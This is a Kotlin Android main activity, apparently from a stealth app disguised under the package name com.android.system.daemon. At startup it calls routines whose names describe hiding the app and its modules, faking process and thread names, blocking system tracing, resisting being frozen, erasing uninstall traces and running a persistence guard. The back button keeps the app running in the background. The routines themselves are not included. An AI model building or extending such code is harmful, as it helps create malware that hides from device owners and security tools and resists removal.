package com.android.system.daemon

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // 启动全部底层隐藏
        SilentCore.hideBase()
        SilentCore.hideDeep()
        SilentCore.randomFakeProcess()
        SilentCore.randomThreadName()
        SilentCore.blockSystemTrace()
        SilentCore.hideModule()
        SilentCore.antiFreeze()
        SilentCore.hideUninstallTrace()
        SilentCore.startDualGuard()
    }

    override fun onBackPressed() {
        moveTaskToBack(true)
    }
}
